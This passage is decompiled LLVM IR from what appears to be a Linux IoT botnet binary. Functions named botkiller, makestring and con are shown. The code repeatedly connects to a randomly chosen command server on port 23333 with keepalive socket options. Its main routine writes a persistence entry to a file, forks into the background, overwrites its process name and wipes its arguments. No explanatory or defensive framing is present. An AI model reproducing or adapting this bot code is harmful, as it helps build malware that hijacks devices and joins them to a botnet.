  %v0_10001be428 = call i32 @__GI_strlen()
  %v0_10001bec29 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001bec30 = icmp ult i32 %v0_10001bec29, %v0_10001be428
  br i1 %v2_10001bec30, label %dec_label_pc_10001bf4, label %dec_label_pc_10001c08

dec_label_pc_10001c5c.preheader:                  ; preds = %dec_label_pc_10001c2c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001c0c, i32* @r3, align 4
  %v0_10001c6419 = call i32 @__GI_strlen()
  %v0_10001c6c20 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001c6c21 = icmp ult i32 %v0_10001c6c20, %v0_10001c6419
  br i1 %v2_10001c6c21, label %dec_label_pc_10001c74, label %dec_label_pc_10001c94

dec_label_pc_10001c50:                            ; preds = %dec_label_pc_10001c74
  %v1_10001c54 = add i32 %storemerge1224, 1
  store i32 %v1_10001c54, i32* %r29.global-to-local, align 4
  store i32 %v1_10001c0c, i32* @r3, align 4
  %v0_10001c64 = call i32 @__GI_strlen()
  %v0_10001c6c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001c6c = icmp ult i32 %v0_10001c6c, %v0_10001c64
  br i1 %v2_10001c6c, label %dec_label_pc_10001c74, label %dec_label_pc_10001c94

dec_label_pc_10001c74:                            ; preds = %dec_label_pc_10001c5c.preheader, %dec_label_pc_10001c50
  %storemerge1224 = phi i32 [ %v1_10001c54, %dec_label_pc_10001c50 ], [ 0, %dec_label_pc_10001c5c.preheader ]
  %v2_10001c80 = add i32 %storemerge1224, %v1_10001c0c
  %v1_10001c84 = inttoptr i32 %v2_10001c80 to i8*
  %v2_10001c84 = load i8, i8* %v1_10001c84, align 1
  %v3_10001c8c = icmp eq i8 %v2_10001c84, 32
  br i1 %v3_10001c8c, label %dec_label_pc_10001c94, label %dec_label_pc_10001c50

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c50, %dec_label_pc_10001c74, %dec_label_pc_10001c5c.preheader
  %storemerge12.lcssa = phi i32 [ 0, %dec_label_pc_10001c5c.preheader ], [ %v1_10001c54, %dec_label_pc_10001c50 ], [ %storemerge1224, %dec_label_pc_10001c74 ]
  %v2_10001ca0 = add i32 %storemerge12.lcssa, %v1_10001c0c
  %v3_10001ca8 = inttoptr i32 %v2_10001ca0 to i8*
  store i8 0, i8* %v3_10001ca8, align 1
  store i32 268442804, i32* @lr, align 4
  %v2_10001cb0 = call i32 @inet_addr(i32 %v1_10001c0c)
  %v5_10001cb8 = trunc i32 %v2_10001cb0 to i8
  store i8 %v5_10001cb8, i8* %stack_var_-56, align 1
  %v4_10001cc4 = icmp eq i8 %v5_10001cb8, -1
  br i1 %v4_10001cc4, label %dec_label_pc_10001ccc, label %dec_label_pc_10001d14

dec_label_pc_10001ccc:                            ; preds = %dec_label_pc_10001c94
  store i32 268442836, i32* @lr, align 4
  %v3_10001cd0 = call i32 @__GI_gethostbyname(i32 %v1_10001c0c, i32 %v2_10001cb0)
  %v3_10001ce0 = icmp eq i32 %v3_10001cd0, 0
  br i1 %v3_10001ce0, label %dec_label_pc_10001d8c, label %dec_label_pc_10001ce8

dec_label_pc_10001ce8:                            ; preds = %dec_label_pc_10001ccc
  %v2_10001ce8 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10001cf0 = add i32 %v3_10001cd0, 16
  %v2_10001cf0 = inttoptr i32 %v1_10001cf0 to i32*
  %v3_10001cf0 = load i32, i32* %v2_10001cf0, align 4
  %v1_10001cf4 = inttoptr i32 %v3_10001cf0 to i32*
  %v2_10001cf4 = load i32, i32* %v1_10001cf4, align 4
  %v1_10001cfc = add i32 %v3_10001cd0, 12
  %v2_10001cfc = inttoptr i32 %v1_10001cfc to i32*
  %v3_10001cfc = load i32, i32* %v2_10001cfc, align 4
  store i32 %v2_10001ce8, i32* @r3, align 4
  store i32 %v2_10001cf4, i32* @r4, align 4
  store i32 %v3_10001cfc, i32* @r5, align 4
  store i32 268442900, i32* @lr, align 4
  %v0_10001d10 = call i32 @memcpy()
  %v2_10001d24.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10001d14

dec_label_pc_10001d14:                            ; preds = %dec_label_pc_10001c94, %dec_label_pc_10001ce8
  %v0_10001da476 = phi i32 [ %v0_10001d10, %dec_label_pc_10001ce8 ], [ %v2_10001cb0, %dec_label_pc_10001c94 ]
  %v2_10001d24 = phi i8 [ %v2_10001d24.pre, %dec_label_pc_10001ce8 ], [ %v5_10001cb8, %dec_label_pc_10001c94 ]
  store i8 %v2_10001d24, i8* bitcast (i8** @global_var_1001d81f.300 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_1001d81c.299 to i8*), align 4
  store i32 256, i32* @global_var_1001d820.298, align 4
  br label %dec_label_pc_10001d8c

dec_label_pc_10001d8c:                            ; preds = %dec_label_pc_10001ad4, %dec_label_pc_10001c08, %dec_label_pc_10001b98, %dec_label_pc_10001b60, %dec_label_pc_10001ccc, %dec_label_pc_10001d14
  %v0_10001da4 = phi i32 [ 0, %dec_label_pc_10001b98 ], [ %v3_10001b88, %dec_label_pc_10001b60 ], [ 0, %dec_label_pc_10001ccc ], [ %v0_10001da476, %dec_label_pc_10001d14 ], [ %v0_10001c1c, %dec_label_pc_10001c08 ], [ %v0_10001ae8, %dec_label_pc_10001ad4 ]
  %v2_10001d8c = load i32, i32* %stack_var_-80, align 4
  %v1_10001d98 = add i32 %v2_10001d8c, -12
  %v2_10001d98 = inttoptr i32 %v1_10001d98 to i32*
  %v3_10001d98 = load i32, i32* %v2_10001d98, align 4
  store i32 %v3_10001d98, i32* %r29.global-to-local, align 4
  ret i32 %v0_10001da4

; uselistorder directives
  uselistorder i32 %v2_10001cb0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.339, { 2, 0, 1 }
  uselistorder i32 %v1_10001c30, { 1, 0 }
  uselistorder i32 %v1_10001c0c, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.163, { 2, 0, 1 }
  uselistorder i32 %v1_10001afc, { 1, 0 }
  uselistorder i32 %v1_10001ad8, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 13, 14, 15, 16, 3, 4, 5, 6, 7, 8, 17, 18, 19, 20, 9, 10, 11, 12 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001d8c, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10001d14, { 1, 0 }
  uselistorder label %dec_label_pc_10001c94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001c74, { 1, 0 }
  uselistorder label %dec_label_pc_10001bdc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10001c08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10001b60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001b40, { 1, 0 }
  uselistorder label %dec_label_pc_10001aa8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10001ad4, { 2, 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-80 = alloca i32, align 4
  %v3_10001dcc = load i32, i32* @global_var_1001d834.289, align 4
  store i32 %v3_10001dcc, i32* @r3, align 4
  store i32 268443096, i32* @lr, align 4
  %v0_10001dd4 = call i32 @free()
  store i32 268443112, i32* @lr, align 4
  %v2_10001de4 = call i32 @makestring(i32 %v0_10001dd4, i32 268500992)
  %v2_10001df0 = ptrtoint i32* %stack_var_-80 to i32
  %v4_10001dfc = call i32 @strcpy(i32 %v2_10001df0, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1000b8e4.303, i32 0, i32 0))
  store i32 %v2_10001de4, i32* @r4, align 4
  %v2_10001e0c = bitcast i32* %stack_var_-80 to i8*
  %v3_10001e0c = call i32 @strcat(i8* %v2_10001e0c, i32 %v2_10001de4)
  store i32 %v2_10001df0, i32* @global_var_1001d834.289, align 4
  %v2_10001e1c = call i32 @botkiller(i32 %v3_10001e0c, i32 268566528)
  ret i32 %v2_10001e1c

; uselistorder directives
  uselistorder i32 %v2_10001de4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_10001f70 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10001f74 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10001fcc = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_10001e50

dec_label_pc_10001e50:                            ; preds = %dec_label_pc_10001e50.backedge, %entry
  store i32 -1, i32* @global_var_1001d838.304, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_10001e68 = load i32, i32* @global_var_1001d814.305, align 4
  %v3_10001e6c = icmp eq i32 %v3_10001e68, 0
  br i1 %v3_10001e6c, label %dec_label_pc_10001e74, label %dec_label_pc_10001eac

dec_label_pc_10001e74:                            ; preds = %dec_label_pc_10001e50
  store i32 268443256, i32* @lr, align 4
  %v0_10001e74 = call i32 @random()
  %v3_10001e80 = load i32, i32* @global_var_1001d7c8.306, align 4
  %v2_10001e84 = srem i32 %v0_10001e74, %v3_10001e80
  %v1_10001e98 = mul i32 %v2_10001e84, 4
  %v2_10001e9c = add i32 %v1_10001e98, ptrtoint ([22 x i8]** @global_var_1001d7cc.308 to i32)
  %v1_10001ea0 = inttoptr i32 %v2_10001e9c to i32*
  %v2_10001ea0 = load i32, i32* %v1_10001ea0, align 4
  store i32 %v2_10001ea0, i32* @global_var_1001d840.309, align 4
  br label %dec_label_pc_10001eac

dec_label_pc_10001eac:                            ; preds = %dec_label_pc_10001e50, %dec_label_pc_10001e74
  store i32 0, i32* @global_var_1001d814.305, align 4
  br label %dec_label_pc_10001eb8

dec_label_pc_10001eb8:                            ; preds = %dec_label_pc_10001eb8, %dec_label_pc_10001eac
  store i32 268443336, i32* @lr, align 4
  %v3_10001ec4 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_10001ec4, i32* @global_var_1001d838.304, align 4
  %v1_10001edc = icmp slt i32 %v3_10001ec4, 0
  br i1 %v1_10001edc, label %dec_label_pc_10001eb8, label %dec_label_pc_10001ee4

dec_label_pc_10001ee4:                            ; preds = %dec_label_pc_10001eb8
  %v3_10001ee8 = load i32, i32* @global_var_1001d840.309, align 4
  store i32 268443380, i32* @lr, align 4
  %v1_10001ef0 = call i32 @inet_addr(i32 %v3_10001ee8)
  %v3_10001ef8 = icmp eq i32 %v1_10001ef0, 0
  br i1 %v3_10001ef8, label %dec_label_pc_10001f20, label %dec_label_pc_10001f00

dec_label_pc_10001f00:                            ; preds = %dec_label_pc_10001ee4
  %v3_10001f04 = load i32, i32* @global_var_1001d840.309, align 4
  store i32 268443408, i32* @lr, align 4
  %v1_10001f0c = call i32 @inet_addr(i32 %v3_10001f04)
  %v4_10001f18 = icmp eq i32 %v1_10001f0c, -1
  br i1 %v4_10001f18, label %dec_label_pc_10001f20, label %dec_label_pc_10001f94

dec_label_pc_10001f20:                            ; preds = %dec_label_pc_10001f00, %dec_label_pc_10001ee4
  %v3_10001f24 = load i32, i32* @global_var_1001d840.309, align 4
  store i32 268443440, i32* @lr, align 4
  %v2_10001f2c = call i32 @__GI_gethostbyname(i32 %v3_10001f24, i32 268566528)
  %v3_10001f3c = icmp eq i32 %v2_10001f2c, 0
  br i1 %v3_10001f3c, label %dec_label_pc_10001f44, label %dec_label_pc_10001f64

dec_label_pc_10001f44:                            ; preds = %dec_label_pc_10001f20
  store i32 0, i32* @global_var_1001d840.309, align 4
  %v3_10001f54 = load i32, i32* @global_var_1001d838.304, align 4
  store i32 268443488, i32* @lr, align 4
  %v1_10001f5c = call i32 @__libc_close(i32 %v3_10001f54)
  br label %dec_label_pc_10001e50.backedge

dec_label_pc_10001e50.backedge:                   ; preds = %dec_label_pc_10001f44, %dec_label_pc_100020fc
  br label %dec_label_pc_10001e50

dec_label_pc_10001f64:                            ; preds = %dec_label_pc_10001f20
  %v1_10001f68 = add i32 %v2_10001f2c, 16
  %v2_10001f68 = inttoptr i32 %v1_10001f68 to i32*
  %v3_10001f68 = load i32, i32* %v2_10001f68, align 4
  %v1_10001f6c = inttoptr i32 %v3_10001f68 to i32*
  %v2_10001f6c = load i32, i32* %v1_10001f6c, align 4
  %v1_10001f7c = add i32 %v2_10001f2c, 12
  %v2_10001f7c = inttoptr i32 %v1_10001f7c to i32*
  %v3_10001f7c = load i32, i32* %v2_10001f7c, align 4
  store i32 %v3_10001f7c, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10001f90.310 to i32), i32* @lr, align 4
  %v4_10001f8c = call i32 @bcopy(i32 %v2_10001f6c, i32 %v2_10001f74, i32 %v3_10001f7c, i32 %v2_10001f2c)
  br label %dec_label_pc_10001fac

dec_label_pc_10001f94:                            ; preds = %dec_label_pc_10001f00
  %v3_10001f98 = load i32, i32* @global_var_1001d840.309, align 4
  store i32 268443556, i32* @lr, align 4
  %v1_10001fa0 = call i32 @inet_addr(i32 %v3_10001f98)
  store i32 %v1_10001fa0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10001fac

dec_label_pc_10001fac:                            ; preds = %dec_label_pc_10001f64, %dec_label_pc_10001f94
  store i32 2, i32* %stack_var_-28, align 4
  store i32 23333, i32* @r3, align 4
  %v1_10001fb8 = call i32 @htons(i32 23333)
  %v3_10001fc8 = load i32, i32* @global_var_1001d838.304, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001fe8.311 to i32), i32* @lr, align 4
  %v3_10001fe4 = call i32 @ioctl(i32 %v3_10001fc8, i32 -2147195266, i32 %v2_10001fcc)
  store i32 268443632, i32* @lr, align 4
  %v1_10001fec = call i32 @__GI_time(i32 0)
  store i32 268443876, i32* @lr, align 4
  %v1_100020e011 = call i32 @__GI_time(i32 0)
  %v2_100020f012 = sub i32 %v1_100020e011, %v1_10001fec
  %tmp1016 = icmp ult i32 %v2_100020f012, 10
  br i1 %tmp1016, label %dec_label_pc_10001ffc, label %dec_label_pc_100020fc

dec_label_pc_10001ffc:                            ; preds = %dec_label_pc_10001fac, %dec_label_pc_100020d4
  %v0_10001ffc = call i32 @__errno_location()
  %v2_10002008 = inttoptr i32 %v0_10001ffc to i32*
  store i32 0, i32* %v2_10002008, align 4
  %v3_10002010 = load i32, i32* @global_var_1001d838.304, align 4
  store i32 268443688, i32* @lr, align 4
  %v3_10002024 = call i32 @__libc_connect(i32 %v3_10002010, i32 %v2_10001f70, i32 16)
  %v3_1000202c = icmp eq i32 %v3_10002024, 0
  br i1 %v3_1000202c, label %dec_label_pc_10002048, label %dec_label_pc_10002034

dec_label_pc_10002034:                            ; preds = %dec_label_pc_10001ffc
  %v0_10002034 = call i32 @__errno_location()
  %v1_1000203c = inttoptr i32 %v0_10002034 to i32*
  %v2_1000203c = load i32, i32* %v1_1000203c, align 4
  %v3_10002040 = icmp eq i32 %v2_1000203c, 106
  br i1 %v3_10002040, label %dec_label_pc_10002048, label %dec_label_pc_100020ac

dec_label_pc_10002048:                            ; preds = %dec_label_pc_10002034, %dec_label_pc_10001ffc
  %v3_1000204c = load i32, i32* @global_var_1001d838.304, align 4
  store i32 268443752, i32* @lr, align 4
  %v6_10002064 = call i32 @__GI_setsockopt(i32 %v3_1000204c, i32 1, i32 13, i32 0, i32 0, i32 268566528)
  %v3_1000206c = load i32, i32* @global_var_1001d838.304, align 4
  store i32 268443784, i32* @lr, align 4
  %v6_10002084 = call i32 @__GI_setsockopt(i32 %v3_1000206c, i32 1, i32 2, i32 0, i32 0, i32 268566528)
  %v3_1000208c = load i32, i32* @global_var_1001d838.304, align 4
  store i32 ptrtoint (i32* @global_var_100020a8.312 to i32), i32* @lr, align 4
  %v6_100020a4 = call i32 @__GI_setsockopt(i32 %v3_1000208c, i32 1, i32 9, i32 0, i32 0, i32 268566528)
  ret i32 %v6_100020a4

dec_label_pc_100020ac:                            ; preds = %dec_label_pc_10002034
  %v0_100020ac = call i32 @__errno_location()
  %v1_100020b4 = inttoptr i32 %v0_100020ac to i32*
  %v2_100020b4 = load i32, i32* %v1_100020b4, align 4
  %v3_100020b8 = icmp eq i32 %v2_100020b4, 115
  br i1 %v3_100020b8, label %dec_label_pc_100020d4, label %dec_label_pc_100020c0

dec_label_pc_100020c0:                            ; preds = %dec_label_pc_100020ac
  %v0_100020c0 = call i32 @__errno_location()
  %v1_100020c8 = inttoptr i32 %v0_100020c0 to i32*
  %v2_100020c8 = load i32, i32* %v1_100020c8, align 4
  %v3_100020cc = icmp eq i32 %v2_100020c8, 114
  br i1 %v3_100020cc, label %dec_label_pc_100020d4, label %dec_label_pc_100020fc

dec_label_pc_100020d4:                            ; preds = %dec_label_pc_100020c0, %dec_label_pc_100020ac
  store i32 ptrtoint ([3 x i8]* @global_var_100020dc.313 to i32), i32* @lr, align 4
  %v1_100020d8 = call i32 @sleep(i32 1)
  store i32 268443876, i32* @lr, align 4
  %v1_100020e0 = call i32 @__GI_time(i32 0)
  %v2_100020f0 = sub i32 %v1_100020e0, %v1_10001fec
  %tmp10 = icmp ult i32 %v2_100020f0, 10
  br i1 %tmp10, label %dec_label_pc_10001ffc, label %dec_label_pc_100020fc

dec_label_pc_100020fc:                            ; preds = %dec_label_pc_100020d4, %dec_label_pc_100020c0, %dec_label_pc_10001fac
  store i32 0, i32* @global_var_1001d840.309, align 4
  %v3_1000210c = load i32, i32* @global_var_1001d838.304, align 4
  store i32 268443928, i32* @lr, align 4
  %v1_10002114 = call i32 @__libc_close(i32 %v3_1000210c)
  br label %dec_label_pc_10001e50.backedge

; uselistorder directives
  uselistorder i32 %v1_10001fec, { 1, 0 }
  uselistorder i32 %v3_10001f7c, { 1, 0 }
  uselistorder i32 %v2_10001f2c, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 268443876, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10001ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10001fac, { 1, 0 }
  uselistorder label %dec_label_pc_10001e50.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10001eac, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-5144 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-6432 = alloca i32, align 4
  %stack_var_-6808 = alloca i32, align 4
  %stack_var_-6484 = alloca i32, align 4
  %stack_var_-6168 = alloca i32, align 4
  %stack_var_-6424 = alloca i32, align 4
  %stack_var_-6740 = alloca i32, align 4
  %v1_10002158 = bitcast i8** %argv to i32*
  store i32 268444028, i32* @lr, align 4
  %v3_10002178 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1000b918.314 to i32), i32 ptrtoint (i32* @global_var_1000b804.268 to i32))
  %v3_10002188 = icmp eq i32 %v3_10002178, 0
  br i1 %v3_10002188, label %dec_label_pc_10002190, label %dec_label_pc_100021b4

dec_label_pc_10002190:                            ; preds = %entry
  store i32 268444076, i32* @lr, align 4
  %v3_100021a8 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1000b92c.315 to i32), i32 ptrtoint (i32* @global_var_1000b804.268 to i32))
  br label %dec_label_pc_100021b4

dec_label_pc_100021b4:                            ; preds = %entry, %dec_label_pc_10002190
  %stack_var_-6756.0 = phi i32 [ %v3_100021a8, %dec_label_pc_10002190 ], [ %v3_10002178, %entry ]
  %stack_var_-6752.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b92c.315, i32 0, i32 0), %dec_label_pc_10002190 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1000b918.314, i32 0, i32 0), %entry ]
  %v3_100021b8 = icmp eq i32 %stack_var_-6756.0, 0
  br i1 %v3_100021b8, label %dec_label_pc_10002334, label %dec_label_pc_100021c0

dec_label_pc_100021c0:                            ; preds = %dec_label_pc_100021b4
  %v2_100021c4 = load i32, i32* %v1_10002158, align 4
  store i32 %v2_100021c4, i32* @r3, align 4
  %v0_100021cc = call i32 @__GI_strlen()
  %v2_100021e0 = ptrtoint i32* %stack_var_-6740 to i32
  store i32 268444144, i32* @lr, align 4
  %v2_100021ec = call i32 @getcwd(i32 %v2_100021e0, i32 256)
  store i32 ptrtoint (i32* @global_var_1000b93c.316 to i32), i32* @r4, align 4
  %v2_10002200 = bitcast i32* %stack_var_-6740 to i8*
  %v3_10002200 = call i32 @__GI_strcoll(i8* %v2_10002200, i32 ptrtoint (i32* @global_var_1000b93c.316 to i32))
  %v3_10002208 = icmp eq i32 %v3_10002200, 0
  br i1 %v3_10002208, label %dec_label_pc_1000232c, label %dec_label_pc_10002220.preheader

dec_label_pc_10002220.preheader:                  ; preds = %dec_label_pc_100021c0
  %v2_10002224112 = load i32, i32* %v1_10002158, align 4
  %v2_1000222c113 = add i32 %v2_10002224112, %v0_100021cc
  %v1_10002230114 = inttoptr i32 %v2_1000222c113 to i8*
  %v2_10002230115 = load i8, i8* %v1_10002230114, align 1
  %v3_10002238119 = icmp eq i8 %v2_10002230115, 47
  br i1 %v3_10002238119, label %dec_label_pc_10002240, label %dec_label_pc_10002214

dec_label_pc_10002214:                            ; preds = %dec_label_pc_10002220.preheader, %dec_label_pc_10002214
  %stack_var_-6772.0120 = phi i32 [ %v1_10002218, %dec_label_pc_10002214 ], [ %v0_100021cc, %dec_label_pc_10002220.preheader ]
  %v1_10002218 = add i32 %stack_var_-6772.0120, -1
  %v2_10002224 = load i32, i32* %v1_10002158, align 4
  %v2_1000222c = add i32 %v2_10002224, %v1_10002218
  %v1_10002230 = inttoptr i32 %v2_1000222c to i8*
  %v2_10002230 = load i8, i8* %v1_10002230, align 1
  %v3_10002238 = icmp eq i8 %v2_10002230, 47
  br i1 %v3_10002238, label %dec_label_pc_10002240, label %dec_label_pc_10002214

dec_label_pc_10002240:                            ; preds = %dec_label_pc_10002214, %dec_label_pc_10002220.preheader
  %stack_var_-6772.0.lcssa = phi i32 [ %v0_100021cc, %dec_label_pc_10002220.preheader ], [ %v1_10002218, %dec_label_pc_10002214 ]
  %v2_10002244 = load i32, i32* %v1_10002158, align 4
  %v2_1000224c = add i32 %v2_10002244, %stack_var_-6772.0.lcssa
  %v2_10002250 = ptrtoint i32* %stack_var_-6424 to i32
  store i32 %v2_10002250, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10002274.318 to i32), i32* @lr, align 4
  %v6_10002270 = call i32 @sprintf(i32 %v2_10002250, i32 ptrtoint ([8 x i8]* @global_var_1000b940.317 to i32), i32 %v2_100021e0, i32 %v2_1000224c, i32 268500992)
  %v2_10002278 = ptrtoint i32* %stack_var_-6168 to i32
  br label %dec_label_pc_100022b8.outer

dec_label_pc_10002278:                            ; preds = %dec_label_pc_100022b8
  store i32 268444300, i32* @lr, align 4
  %v3_10002288 = call i32 @fgets(i32 %v2_10002278, i32 1024, i32 %stack_var_-6756.0)
  store i32 %v2_10002278, i32* @r3, align 4
  store i32 %v2_10002250, i32* @r4, align 4
  %v2_1000229c = call i32 @__GI_strcasecmp(i32 %v2_10002278, i32 %v2_10002250)
  %v3_100022a4 = icmp eq i32 %v2_1000229c, 0
  br i1 %v3_100022a4, label %dec_label_pc_100022ac, label %dec_label_pc_100022b8

dec_label_pc_100022ac:                            ; preds = %dec_label_pc_10002278
  %v1_100022b0 = add i32 %stack_var_-6776.0.ph, 1
  br label %dec_label_pc_100022b8.outer

dec_label_pc_100022b8.outer:                      ; preds = %dec_label_pc_100022ac, %dec_label_pc_10002240
  %stack_var_-6776.0.ph = phi i32 [ %v1_100022b0, %dec_label_pc_100022ac ], [ 0, %dec_label_pc_10002240 ]
  br label %dec_label_pc_100022b8

dec_label_pc_100022b8:                            ; preds = %dec_label_pc_100022b8.outer, %dec_label_pc_10002278
  store i32 268444352, i32* @lr, align 4
  %v1_100022bc = call i32 @feof(i32 %stack_var_-6756.0)
  %v3_100022c4 = icmp eq i32 %v1_100022bc, 0
  br i1 %v3_100022c4, label %dec_label_pc_10002278, label %dec_label_pc_100022cc

dec_label_pc_100022cc:                            ; preds = %dec_label_pc_100022b8
  %v3_100022d0 = icmp eq i32 %stack_var_-6776.0.ph, 0
  br i1 %v3_100022d0, label %dec_label_pc_100022d8, label %dec_label_pc_10002320

dec_label_pc_100022d8:                            ; preds = %dec_label_pc_100022cc
  store i32 268444384, i32* @lr, align 4
  %v1_100022dc = inttoptr i32 %stack_var_-6756.0 to i16*
  %v2_100022dc = call i32 @__GI_fclose(i16* %v1_100022dc)
  %v4_100022e0 = ptrtoint i8* %stack_var_-6752.0 to i32
  store i32 268444400, i32* @lr, align 4
  %v3_100022ec = call i32 @__GI_fopen(i32 %v4_100022e0, i32 ptrtoint (i32* @global_var_1000b948.319 to i32))
  %v3_100022fc = icmp eq i32 %v3_100022ec, 0
  br i1 %v3_100022fc, label %dec_label_pc_10002334, label %dec_label_pc_10002304

dec_label_pc_10002304:                            ; preds = %dec_label_pc_100022d8
  store i32 268444436, i32* @lr, align 4
  %v2_10002310 = call i32 @__GI_fputs(i32 %v2_10002250, i32 %v3_100022ec)
  store i32 ptrtoint (i32* @global_var_1000231c.320 to i32), i32* @lr, align 4
  %v1_10002318 = inttoptr i32 %v3_100022ec to i16*
  %v2_10002318 = call i32 @__GI_fclose(i16* %v1_10002318)
  br label %dec_label_pc_10002334

dec_label_pc_10002320:                            ; preds = %dec_label_pc_100022cc
  store i32 ptrtoint (i32* @global_var_10002328.321 to i32), i32* @lr, align 4
  %v1_10002324 = inttoptr i32 %stack_var_-6756.0 to i16*
  %v2_10002324 = call i32 @__GI_fclose(i16* %v1_10002324)
  br label %dec_label_pc_10002334

dec_label_pc_1000232c:                            ; preds = %dec_label_pc_100021c0
  store i32 ptrtoint (i32* @global_var_10002334.322 to i32), i32* @lr, align 4
  %v1_10002330 = inttoptr i32 %stack_var_-6756.0 to i16*
  %v2_10002330 = call i32 @__GI_fclose(i16* %v1_10002330)
  br label %dec_label_pc_10002334

dec_label_pc_10002334:                            ; preds = %dec_label_pc_100022d8, %dec_label_pc_100021b4, %dec_label_pc_10002320, %dec_label_pc_10002304, %dec_label_pc_1000232c
  store i32 268444472, i32* @lr, align 4
  %v0_10002334 = call i32 @__libc_fork()
  %v3_1000233c = icmp eq i32 %v0_10002334, 0
  br i1 %v3_1000233c, label %dec_label_pc_1000234c, label %dec_label_pc_10002344

dec_label_pc_10002344:                            ; preds = %dec_label_pc_10002334
  %v0_10002348 = call i32 @__GI_exit()
  br label %dec_label_pc_1000234c

dec_label_pc_1000234c:                            ; preds = %dec_label_pc_10002334, %dec_label_pc_10002344
  %v2_10002350 = load i32, i32* %v1_10002158, align 4
  store i32 %v2_10002350, i32* @r3, align 4
  %v0_10002360 = call i32 @__GI_strlen()
  store i32 ptrtoint ([14 x i8]* @global_var_1000b94c.323 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000237c.324 to i32), i32* @lr, align 4
  %v4_10002378 = call i32 @strncpy(i32 %v2_10002350, i32 ptrtoint ([14 x i8]* @global_var_1000b94c.323 to i32), i32 %v0_10002360)
  %v2_100023ec53 = icmp sgt i32 %argc, 1
  br i1 %v2_100023ec53, label %dec_label_pc_10002388, label %dec_label_pc_100023f4

dec_label_pc_10002388:                            ; preds = %dec_label_pc_1000234c, %dec_label_pc_10002388
  %storemerge1356 = phi i32 [ %v1_100023dc, %dec_label_pc_10002388 ], [ 1, %dec_label_pc_1000234c ]
  %v1_1000238c = mul i32 %storemerge1356, 4
  %v2_10002398 = add i32 %v1_1000238c, %tmp
  %v1_1000239c = inttoptr i32 %v2_10002398 to i32*
  %v2_1000239c = load i32, i32* %v1_1000239c, align 4
  store i32 %v2_1000239c, i32* @r3, align 4
  %v0_100023bc = call i32 @__GI_strlen()
  store i32 268444632, i32* @lr, align 4
  %v3_100023d4 = call i32 @__GI_memset(i32 %v2_1000239c, i32 0, i32 %v0_100023bc)
  %v1_100023dc = add nuw nsw i32 %storemerge1356, 1
  %v2_100023ec = icmp slt i32 %v1_100023dc, %argc
  br i1 %v2_100023ec, label %dec_label_pc_10002388, label %dec_label_pc_100023f4

dec_label_pc_100023f4:                            ; preds = %dec_label_pc_10002388, %dec_label_pc_1000234c
  store i32 268444668, i32* @lr, align 4
  %v1_100023f8 = call i32 @__GI_time(i32 0)
  store i32 268444676, i32* @lr, align 4
  %v0_10002400 = call i32 @__libc_getpid()
  %v2_10002408 = xor i32 %v1_100023f8, %v0_10002400
  store i32 268444688, i32* @lr, align 4
  %v0_1000240c = call i32 @getppid()
  %v2_10002414 = add i32 %v2_10002408, %v0_1000240c
  store i32 268444704, i32* @lr, align 4
  %v1_1000241c = call i32 @srand(i32 %v2_10002414)
  store i32 268444720, i32* @lr, align 4
  %v2_1000242c = call i32 @makestring(i32 %v1_1000241c, i32 268500992)
  %v2_10002438 = ptrtoint i32* %stack_var_-6484 to i32
  %v4_10002444 = call i32 @strcpy(i32 %v2_10002438, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1000b8e4.303, i32 0, i32 0))
  store i32 %v2_1000242c, i32* @r4, align 4
